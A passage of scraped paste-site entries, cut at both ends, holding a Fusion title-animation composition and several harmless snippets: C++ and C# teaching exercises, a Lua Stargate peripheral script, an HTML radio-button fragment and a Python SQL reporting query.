						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Alpha4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 279.425 } },
				},
				LineColor = Background {
					ExtentSet = true,
					NameSet = true,
					CustomData = {
						Settings = {
						}
					},
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Bitmap1"",
							Source = ""Mask"",
						},
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						TopLeftRed = Input { Value = 1, },
						TopLeftBlue = Input { Value = 0.228, },
						LineColor = Input { Value = 1, }
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 250.145 } },
					UserControls = ordered() { LineColor = { INP_Integer = false, LBLC_DropDownButton = true, LINKID_DataType = ""Number"", LBLC_NumInputs = 4, INPID_InputControl = ""LabelControl"", LINKS_Name = ""Line Color"", } }
				},
				Merge4 = Merge {
					Inputs = {
						Background = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						FlipHoriz = Input { Value = 1, },
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 160.806 } },
				},
				Transform3 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path6"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 329.722 } },
				},
				Path6 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path6Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = 0, Y = -0.5, RX = 0, RY = 0.166666666666667 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = 0, LY = -0.166666666666667 }
								}
							},
						},
					},
				},
				Path6Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 32.8181818181818, 0 }, Flags = { LockedY = true } },
						[46] = { 1, LH = { 22.6644620811287, 1 }, RH = { 59.9985997676849, 1 }, Flags = { LockedY = true } },
						[88] = { 1, LH = { 74.0014002323151, 1 }, RH = { 97.665699839592, 1 } },
						[117] = { 0, LH = { 107.334300160408, 0 } }
					}
				},
				Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					Inputs = {
						Offset3 = Input {
							Value = Point {
								X = 0,
								Y = -0.077
							},
						},
						ExtendVertical3 = Input { Value = 0.19, },
						Level3 = Input { Value = 2, },
						ElementShape3 = Input { Value = 2, },
						ExtendHorizontal3 = Input { Value = 1.17, },
						Position3 = Input { Value = 1, },
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						CharacterSpacing = Input { Value = 1.102, },
						SelectElement = Input { Value = 5, },
						Select = Input { Value = 3, },
						Name3 = Input { Value = ""BlackBG Mask"", },
						Name4 = Input { Value = ""Black BG"", },
						Enabled4 = Input { Value = 1, },
						Name5 = Input { Value = ""OrangeMask"", },
						Enabled5 = Input { Value = 1, },
						Name6 = Input { Value = ""Orange"", },
						Enabled6 = Input { Value = 1, },
						Thickness1 = Input { Value = 0.0882, },
						ExtendHorizontal1 = Input { Value = 0.95, },
						ExtendVertical1 = Input { Value = 0.16, },
						Position1 = Input { Value = 1, },
						StyledText = Input { Value = ""Just\nCrop\nIt"", },
						Font = Input { Value = ""Open Sans"", },
						Style = Input { Value = ""Semibold"", },
						Size = Input { Value = 0.0709, },
						VerticalJustificationNew = Input { Value = 3, },
						HorizontalJustificationNew = Input { Value = 3, },
						Level4 = Input { Value = 0, },
						ExtendHorizontal4 = Input { Value = 0.6, },
						ExtendVertical4 = Input { Value = 0.03, },
						Blue4 = Input { Value = 0, },
						Alpha4 = Input { Value = 0.551, },
						Position4 = Input { Value = 1, },
						ElementShape5 = Input { Value = 2, },
						Level5 = Input { Value = 0, },
						ExtendHorizontal5 = Input { Value = 0.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { Value = 0, },
						Position5 = Input { Value = 1, },
						ElementShape6 = Input { Value = 2, },
						Level6 = Input { Value = 0, },
						ExtendHorizontal6 = Input { Value = 0.72, },
						ExtendVertical6 = Input { Value = 0.16, },
						Red6 = Input { Value = 0.8270000219345, },
						Green6 = Input { Value = 0.5934485793114, },
						Blue6 = Input { Value = 0.1149529963732, },
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 89.6366 } },
				},
				Rectangle4 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { 143.402, 100.054 } },
				},
				ChannelBooleans1 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Rectangle4"",
							Source = ""Mask"",
						},
						ApplyMaskInverted = Input { Value = 1, },
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform2"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 100.054 } },
				},
				Transform2 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path5"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Instance_Text1_1_1"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 48.5795 } },
				},
				Path5 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path5Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = -0.5, Y = 0, RX = 0.166666666666667, RY = 0 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = -0.166666666666667, LY = 0 }
								}
							},
						},
					},
				},
				Path5Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[2] = { 0, RH = { 18.4040404040404, 0 }, Flags = { LockedY = true } },
						[31] = { 1, LH = { 10.7, 1 }, RH = { 52.6644996404648, 1 }, Flags = { LockedY = true } },
						[96] = { 1, LH = { 74.3355003595352, 1 }, RH = { 105.665699839592, 1 } },
						[125] = { 0, LH = { 115.334300160408, 0 } }
					}
				},
				Instance_Text1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Shear4 = Input { },
						Position4 = Input { Value = 1, },
						Properties4 = Input { },
						Softness4 = Input { },
						Size4 = Input { },
						Rotation4 = Input { },
						EffectMask = Input {
							SourceOp = ""Rectangle3"",
							Source = ""Mask"",
						},
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 7.9451 } },
				},
				Rectangle3 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { -132.02, 7.9451 } },
				},
				Instance_Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					SourceOp = ""Text"",
					Inputs = {
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Enabled5 = Input { Value = 1, },
						Enabled6 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						ExtendHorizontal5 = Input { Value = 0.38, },
						ExtendVertical5 = Input { Value = 1.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
						EffectMask = Input { }
					},
					ViewInfo = OperatorInfo { Pos = { -110.669, 112.98 } },
				},
				Bitmap1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						PaintMode = Input { Value = FuID { ""Subtract"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Merge4"",
							Source = ""Output"",
						},
						Channel = Input { Value = FuID { ""Luminance"" }, },
						EffectMask = Input {
							SourceOp = ""Bitmap1_1"",
							Source = ""Mask"",
						}
					},
					ViewInfo = OperatorInfo { Pos = { 15.6112, 205.482 } },
				},
				Bitmap1_1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Instance_Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -93.3713, 185.132 } },
				}
			},
		}
	},
	ActiveTool = ""DarkBoxText""
}"
HtCVZx5A,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:41:21 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;


class Animal {
        string sound;
    public:
        Animal(string sound){
            this->sound = sound;
        }
        void makeSound(){
            cout << sound << endl;
        }
};
class Dog : public Animal {
    public:
        Dog(string sound = ""Woof!"")
            :Animal(sound)
        {
        }

};
class Cat : public Animal {
    public:
        Cat(string sound = ""Miaw!"")
            :Animal(sound)
        {
        }
};

int main(){

    Dog dog;
    dog.makeSound();

    Cat cat(""Mew!"");
    cat.makeSound();

    return 0;
}
"
h729yQbe,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:10:25 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;



class Account {
    private:
        double money;
        static int accessCount;

    public:
        Account(){
            //accessCount = 0;
            this->money = 0;
        }
        Account(double money){
            if(money > 0){
                ++accessCount;
                this->money = money;
            } else {
                this->money = 0;
            }
        }

        double in(double money){
            if (money > 0)
                accessCount++;
            //cout << money << "" "" << this->money << "" "" << ::money << endl;
            this->money += money;
            return this->money;
        }

        double out(double money){
            double t = min(money, this->money);
            this->money -= t;
            if(t > 0){
                accessCount++;
            }
            return t;
        }

        double get(){
            return money;
        }

        static int getAccessCount(){
            return accessCount;
        }

        void print(){
            cout << ""Account: "" << money << "" EUR "" << endl;
        }
};
int Account::accessCount = 0;



int main(){

    Account account1(0);
    account1.print();
    double a1 = account1.in(100);
    cout << ""Total "" << a1 << endl;
    account1.print();
    double b1 = account1.out(0);
    cout << ""Took out "" << b1 << endl;
    account1.print();
    cout << ""Total "" << account1.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    cout << endl << endl;

    Account account2(0);
    account2.print();
    double a2 = account2.in(100);
    cout << ""Total "" << a2 << endl;
    account2.print();
    double b2 = account2.out(0);
    cout << ""Took out "" << b2 << endl;
    account2.print();
    cout << ""Total "" << account2.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    return 0;
}
"
bdCmcdG6,Untitled,_KAGATUN_,C#,Tuesday 23rd of April 2024 10:06:14 AM CDT,"using System;
using System.Collections.Generic;

class Program
{
    static void Main(string[] args)
    {
        const string AddFish = ""1"";
        const string RemoveFish = ""2"";
        const string ExitCommand = ""3"";

        Aquarium aquarium = new Aquarium();

        bool isWork = true;

        while (isWork)
        {
            Console.WriteLine($""Максимально рыбок в аквариуме может быть {aquarium.Capacity}\n"");

            aquarium.ShowFishes();

            Console.WriteLine($""\nВведите {AddFish} чтобы добавить рыбку в аквариум"");
            Console.WriteLine($""\nВведите {RemoveFish} чтобы убрать рыбку из аквариума"");
            Console.WriteLine($""\nВведите {ExitCommand} чтобы закрыть программу"");

            string userInput = Console.ReadLine();

            Console.Clear();

            switch (userInput)
            {
                case AddFish:
                    aquarium.FillFishes();
                    break;

                case RemoveFish:
                    aquarium.RemoveFish();
                    break;

                case ExitCommand:
                    isWork = false;
                    break;

                default:
                    Console.WriteLine(""\nПрошёл год\n"");
                    break;
            }

            aquarium.AddAgeAll();

            Console.ReadKey();
            Console.Clear();
        }
    }
}

class Fish
{
    public Fish(string name, int maxAge)
    {
        Age = 0;
        Name = name;
        MaxAge = maxAge;
    }

    public string Name { get; protected set; }
    public int MaxAge { get; protected set; }
    public int Age { get; protected set; }

    public bool IsAlive => Age < MaxAge;

    public void ShowInfo()
    {
        Console.WriteLine($""Название рыбки {Name}. Максимальный возраст {MaxAge} лет."");
    }

    public void ShowFish()
    {
        if (IsAlive)
        {
            Console.WriteLine($""Рыбке {Name} лет {Age}."");
        }
        else
        {
            Console.WriteLine($""Рыбка {Name} мертва."");
        }
    }

    public void AddAge()
    {
        Age++;
    }
}

class Cardinal : Fish
{
    public Cardinal() : base(""Кардинал"", 4) { }
}

class Goldfish : Fish
{
    public Goldfish() : base(""Золотая рыбка"", 30) { }
}

class Severum : Fish
{
    public Severum() : base(""Северум"", 15) { }
}

class BlackLabeo : Fish
{
    public BlackLabeo() : base(""Чёрный лабео"", 7) { }
}

class SilverMetynnis : Fish
{
    public SilverMetynnis() : base(""Метиннис серебристый"", 8) { }
}

class Discus : Fish
{
    public Discus() : base(""Дискус"", 18) { }
}

class Aquarium
{
    private List<Fish> _fishes = new List<Fish>();

    public int Capacity { get; private set; } = 5;

    public void ShowFishes()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                _fishes[i].ShowFish();
            }
        }
        else
        {
            Console.WriteLine(""Аквариум пустой"");
        }
    }

    public void AddAgeAll()
    {
        for (int i = 0; i < _fishes.Count; i++)
        {
            if (_fishes[i].IsAlive)
            {
                _fishes[i].AddAge();
            }
        }
    }

    public void RemoveFish()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                Console.WriteLine((i + 1) + ""№ "");
                _fishes[i].ShowFish();
            }

            Console.WriteLine(""\nВведите номер рыбки для её удаления\n"");
            string number = Console.ReadLine();

            int index = ValidateIndex(number, _fishes.Count);

            if (index != -1)
            {
                _fishes.RemoveAt(index - 1);
                Console.WriteLine(""\nРыбка удалена\n"");
            }            
        }
        else
        {
            Console.WriteLine(""Аквариум пустой"");
        }      
    }

    public void FillFishes()
    {
        if (Capacity > _fishes.Count)
        {
            _fishes.Add(FillFish());
            Console.WriteLine(""\nРыбка добавлена"");
        }
        else
        {
            Console.WriteLine(""Аквариум заполнен"");
        }
    }

    private Fish FillFish()
    {
        List<Fish> fishes = new List<Fish> 
        {
            new Cardinal (),
            new Goldfish(),
            new Severum(),
            new BlackLabeo(),
            new SilverMetynnis(),
            new Discus() 
        };

        for (int i = 0; i < fishes.Count; i++)
        {
            Console.WriteLine((i + 1) + ""№ "");
            fishes[i].ShowInfo();
        }

        Fish selectedFish = null;

        Console.WriteLine(""\nВведите номер рыбки для добавления"");

        bool isWorks = true;

        while (isWorks)
        {
            string number = Console.ReadLine();
            int index = ValidateIndex(number, fishes.Count);

            if (index != -1)
            {
                selectedFish = fishes[index - 1];

                return selectedFish;
            }
        }

        return selectedFish;
    }

    private int ValidateIndex(string inputNumber, int maxValue)
    {
        int incorrectNumber = -1;

        if (int.TryParse(inputNumber, out int index))
        {
            if (index > 0 && index <= maxValue)
            {
                return index;
            }
        }

        Console.WriteLine(""\nРыбки под таким номером нет\n"");
        return incorrectNumber;
    }
}

"
eCSWwvLS,sgjourney Stargate Type test,PerryExtra,Lua,Tuesday 23rd of April 2024 10:02:18 AM CDT,"INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};

INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = nil;
end

if INTERFACE_TYPE == nil then
    STARGATE_TYPE = nil;
else
    STARGATE_TYPE = INTERFACE.getStargateType();
end

print(""Interface Type : "" + INTERFACE_TYPE);
print(""Stargate Type : "" + STARGATE_TYPE);"
k1zMG0gY,Mad,Unknown_No_1,PHP,Tuesday 23rd of April 2024 09:47:14 AM CDT,palestine
fTPf322t,link input and label,VanoHa,HTML 5,Tuesday 23rd of April 2024 09:44:46 AM CDT,"<div>
  <input type=""radio"" id=""python"" name=""language"" checked>
  <label for=""python"">Python</label>
</div>
<div>
  <input type=""radio"" id=""java"" name=""language"">
  <label for=""java"">Java</label>
</div>"
6xWt8m3Z,python,sergyo,Python,Tuesday 23rd of April 2024 09:41:36 AM CDT,"from sql import Null, Literal, With, Union, Cast, Column, Window, Table
from sql.aggregate import Sum, Min
from sql.operators import Concat, Not
from sql.conditionals import Coalesce, Case
from sql.functions import Round, Position, Substring
from datetime import date

DIGITS = 4
from_date = date(2024, 1, 1)
bunit_load = Table('stock_unit_load')
brline = Table('agro_goods_receipt_line')
breceipt = Table('agro_goods_receipt')

base_query = bunit_load.join(brline, condition=(
        brline.id == bunit_load.goods_receipt_line)
    ).join(breceipt, condition=(breceipt.id == brline.receipt)
    ).select(
        bunit_load.id.as_('received_unit_load'),
        bunit_load.internal_quantity.as_('received_quantity'),
        bunit_load.id.as_('destination_unit_load'),
        bunit_load.internal_quantity.as_('destination_quantity'),
        where=(
            (breceipt.company == 1)
            & (Coalesce(breceipt.effective_date, from_date) > from_date)
            & (
                (bunit_load.sale_line != Null)
                | bunit_load.shipment.like('stock.shipment.in.return,%')
            )
        )
    )


invoice_line = Table('account_invoice_line')
invoice = Table('account_invoice')
saleline2 = Table('sale_line')
sale2 = Table('sale_sale')

invoice_origin_column = Cast(Substring(invoice_line.origin,
        Position(',', invoice_line.origin) + Literal(1)),
        'int')
invoice_query = invoice_line.join(invoice, type_='LEFT', condition=(
            invoice.id == invoice_line.invoice)
    ).join(saleline2, condition=(saleline2.id == invoice_origin_column)
    ).join(sale2, condition=(sale2.id == saleline2.sale)
    ).select(
        invoice_origin_column.as_('sale_line'),
        Sum(invoice_line.unit_price * invoice_line.quantity
            ).as_('amount'),
        Sum(invoice_line.quantity).as_('quantity'),
        Min(invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(invoice.state, 'draft') != 'cancelled')
            & (invoice_line.origin != Null)
            & invoice_line.origin.like('sale.line,%')
            & (sale2.company == 1)
            & (Coalesce(sale2.sale_date, from_date) > from_date)
        ),
        group_by=invoice_origin_column
)

unit_load = Table('stock_unit_load')
rline = Table('agro_goods_receipt_line')
receipt = Table('agro_goods_receipt')
entry = Table('agro_goods_entry')
product = Table('product_product')
template = Table('product_template')
company = Table('company_company')
currency = Table('currency_currency')
uom = Table('product_uom')
sale_unit_load = Table('stock_unit_load')
destination_product = Table('product_product')
destination_comb = Table('agro_product_attribute_combination')
sale_line = Table('sale_line')
sale = Table('sale_sale')

windows = {
    'sale_quantity': Sum(
        base_query.destination_quantity,
        window=Window([sale_line.id])),
    'entry_quantity': Sum(
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null), window=Window(
            [rline.entry]))
}

cost_line = Table('agro_goods_entry_cost_line')
cost = Table('agro_goods_entry_cost')
cost_type = Table('agro_goods_entry_cost_type')
cost_entry = Table('agro_goods_entry')
cost_receipt = Table('agro_goods_receipt')
base_cost_query = cost_line.join(cost, condition=(cost.id == cost_line.cost)
        ).join(cost_type, condition=(cost_type.id == cost.type_)
        ).join(cost_entry, condition=(cost_entry.id == cost_line.document_line)
        ).join(cost_receipt, condition=cost_receipt.id == cost_entry.receipt)
cost_query = base_cost_query.select(
    cost_line.document_line.as_('entry'),
    Sum(cost_line.amount).as_('amount'),
    where=(
        (cost_receipt.company == 1)
        & (Coalesce(cost_receipt.effectivate_date, from_date) > from_date)
        & (cost_line.amount != Null)
        & (cost.state == 'confirmed')),
    group_by=cost_line.document_line)

entry_invoice_line = Table('account_invoice_line')
entry_invoice = Table('account_invoice')
ientry = Table('agro_goods_entry')
ireceipt = Table('agro_goods_receipt')
invoice_origin_column = Substring(entry_invoice_line.origin,
    Position(',', entry_invoice_line.origin) + Literal(1))
invoice_entry_base_query = entry_invoice_line.join(entry_invoice, type_='LEFT',
        condition=(invoice.id == invoice_line.invoice)
    ).join(ientry, condition=(
        ientry.id == invoice_origin_column.cast('int'))
    ).join(ireceipt, condition=(ireceipt.id == ientry.receipt))
invoice_entry_query = invoice_entry_base_query.select(
        Cast(invoice_origin_column, 'int').as_('entry'),
        Sum(entry_invoice_line.unit_price * entry_invoice_line.quantity
            ).as_('amount'),
        Min(entry_invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(entry_invoice.state, 'draft') != 'cancelled')
            & (ireceipt.company == 1)
            & (Coalesce(ireceipt.effective_date, from_date) > from_date)
            & entry_invoice_line.origin.like('agro.goods.entry,%')
        ),
        group_by=invoice_origin_column)

prcost = Table('cm_unit_load_cost_alloc')
processing_rcost = prcost.select(
    prcost.end_.as_('unit_load'),
    Sum(prcost.amount).as_('processing_cost_amount'),
    Sum(Case((prcost.type_ == 1, prcost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((prcost.type_ == 2, prcost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (prcost.company == 1)
        & (Coalesce(prcost.date, from_date) > from_date)),
    group_by=prcost.end_
)

pscost = Table('cm_unit_load_cost_alloc')
processing_scost = pscost.select(
    pscost.end_.as_('unit_load'),
    Sum(pscost.amount).as_('processing_cost_amount'),
    Sum(Case((pscost.type_ == 1, pscost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((pscost.type_ == 2, pscost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (pscost.company == 1)
        & (Coalesce(pscost.date, from_date) > from_date)),
    group_by=pscost.end_
)

scost = Table('sale_cost')
scost_line = Table('sale_cost_line')
scost_type = Table('sale_cost_type')
scost_sale = Table('sale_sale')
sale_cost_base_query = scost_line.join(scost,
        condition=(scost.id == scost_line.cost)
    ).join(scost_type, condition=(scost_type.id == scost.type_)
    ).join(scost_sale, condition=(scost.document == scost_sale.id))
sale_cost_query = sale_cost_base_query.select(
    scost_line.document_line.as_('sale_line'),
    Sum(scost_line.amount).as_('amount'),
    where=(
        (scost_sale.company == 1)
        & (Coalesce(scost_sale.sale_date, from_date) > from_date)),
    group_by=scost_line.document_line)

sale_account_line = Table('sale_sale_account_line')
asale_line = Table('sale_line')
asale = Table('sale_sale')
sale_account_query = sale_account_line.join(asale_line, condition=(
        sale_account_line.sale_line == asale_line.id)
    ).join(asale, condition=(asale.id == asale_line.sale)
    ).select(
        sale_account_line.sale_line,
        Sum(sale_account_line.quantity).as_('quantity'),
        where=(
            (sale.company == 1)
            & (Coalesce(sale.sale_date, from_date) > from_date)),
        group_by=(sale_account_line.sale_line))


query = base_query.join(unit_load, condition=(
            base_query.received_unit_load == unit_load.id)
        ).join(product, condition=(
            product.id == unit_load.product)
        ).join(template, condition=(
            product.template == template.id)
        ).join(rline, condition=(
            rline.id == unit_load.goods_receipt_line)
        ).join(entry, condition=(
            rline.entry == entry.id)
        ).join(receipt, condition=(receipt.id == rline.receipt)
        ).join(company, condition=(unit_load.company == company.id)
        ).join(currency, condition=(company.currency == currency.id)
        ).join(uom, condition=(uom.id == template.default_uom)
        ).join(sale_unit_load, 'LEFT', condition=(
            sale_unit_load.id == base_query.destination_unit_load)
        ).join(destination_product, 'LEFT', condition=(
            sale_unit_load.product == destination_product.id)
        ).join(destination_comb, 'LEFT', condition=(
            destination_comb.result_product == destination_product.template)
        ).join(sale_line, type_='LEFT', condition=(
            sale_line.id == sale_unit_load.sale_line)
        ).join(sale, type_='LEFT', condition=(sale.id == sale_line.sale)
        ).join(invoice_query, type_='LEFT', condition=(
            invoice_query.sale_line == sale_line.id)
        ).join(cost_query, 'LEFT', condition=(
            cost_query.entry == entry.id)
        ).join(invoice_entry_query, type_='LEFT', condition=(
            invoice_entry_query.entry == entry.id)
        ).join(processing_rcost, 'LEFT', condition=(
            processing_rcost.unit_load == unit_load.id)
        ).join(processing_scost, 'LEFT', condition=(
            (sale_unit_load.id != Null)
            & (processing_scost.unit_load == sale_unit_load.id)
            & (processing_scost.unit_load != unit_load.id))
        ).join(sale_cost_query, 'LEFT', condition=(
            sale_cost_query.sale_line == sale_line.id)
        ).join(sale_account_query, 'LEFT',
            condition=(sale_account_query.sale_line == sale_line.id)
    ).select(
        unit_load.create_date,
        unit_load.write_date,
        unit_load.create_uid,
        unit_load.write_uid,
        unit_load.company,
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.id),
            else_=Literal(Null)).as_('received_unit_load'),
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.product),
            else_=Literal(Null)).as_('received_product'),
        Cast(receipt.effective_date, 'date').as_('receipt_date'),
        rline.receipt,
        rline.entry.as_('goods_entry'),
        entry.producer,
        entry.origin.as_('entry_origin'),
        Case(
            (Coalesce(entry.origin, '').like('agro.farm.batch,%'),
                Cast(Substring(entry.origin,
                    Position(',', entry.origin) + Literal(1)),
                        'int')
            ),
            else_=Literal(Null)
        ).as_('batch'),
        entry.base_product,
        entry.crop,
        sale.id.as_('sale'),
